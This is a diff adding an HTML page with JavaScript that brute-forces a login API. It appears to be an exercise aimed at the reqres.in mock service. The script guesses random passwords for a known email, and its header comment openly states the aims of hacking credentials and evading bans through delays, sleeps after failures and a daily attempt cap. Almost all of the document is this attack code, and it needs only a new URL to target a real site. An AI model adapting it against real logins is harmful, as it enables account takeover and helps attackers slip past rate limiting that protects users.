@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Brute-Force Login Demo</title>
+  </head>
+  <body>
+    <h1>Brute-Force Login Demo</h1>
+    <button id="startButton">Start Brute-Force</button>
+    <div id="output"></div>
+
+    <script>
+      /**
+        Create a small Brute-Force program to hack user credentials via this login 
+        API: https://reqres.in/api/login. See API description on the website.
+
+        * Assuming we know user email.
+        * Assuming we know password length (generate random).
+
+        To prevent us from being banned: 
+          * Call API every 100ms with some random delay.
+          * After 5 failures, sleep 5s.
+          * After 10 failures, sleep 10s.
+          * Stop after 1000 attempts until the next day.
+      */
+      const API_URL = "https://reqres.in/api/login";
+      const EMAIL = "eve.holt@reqres.in";
+      const PASSWORD_LENGTH = 8;
+      // Maximum number of attempts
+      const MAX_ATTEMPTS = 1000; // update if testing
+
+      let attempts = 0;
+      let failures = 0;
+
+      // Generate a random password of specified length
+      function generatePassword() {
+        const chars =
+          "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";
+        return Array.from(
+          { length: PASSWORD_LENGTH },
+          () => chars[Math.floor(Math.random() * chars.length)]
+        ).join("");
+      }
+
+      // Attempt to login with given password
+      async function attemptLogin(password) {
+        const response = await fetch(API_URL, {
+          method: "POST",
+          // headers: { "Content-Type": "application/json" }, comment for testing get status 400
+          body: JSON.stringify({ email: EMAIL, password })
+        });
+        return response.ok;
+      }
+
+      // Main brute force function
+      async function bruteForce() {
+        while (attempts < MAX_ATTEMPTS) {
+          const password = generatePassword();
+          attempts++;
+
+          try {
+            const success = await attemptLogin(password);
+            if (success) {
+              output(`Success! Password: ${password}`);
+              return;
+            } else {
+              failures++;
+              output(`Attempt ${attempts}: Failed. Failures: ${failures}`);
+
+              // Implement exponential backoff
+              if (failures % 10 === 0) {
+                output("Sleeping for 10 seconds...");
+                await new Promise((resolve) => setTimeout(resolve, 10000));
+              } else if (failures % 5 === 0) {
+                output("Sleeping for 5 seconds...");
+                await new Promise((resolve) => setTimeout(resolve, 5000));
+              }
+            }
+          } catch (error) {
+            console.error("Error:", error);
+          }
+
+          // Add a small random delay between attempts
+          const delay = 100 + Math.random() * 100;
+          await new Promise((resolve) => setTimeout(resolve, delay));
+        }
+
+        output("Max attempts reached. Stopping until tomorrow.");
+      }
+
+      // Function to display output on the page
+      function output(message) {
+        document.getElementById("output").innerHTML += `<p>${message}</p>`;
+      }
+
+      // Event listener for the start button
+      document
+        .getElementById("startButton")
+        .addEventListener("click", bruteForce);
+    </script>
+  </body>
+</html>
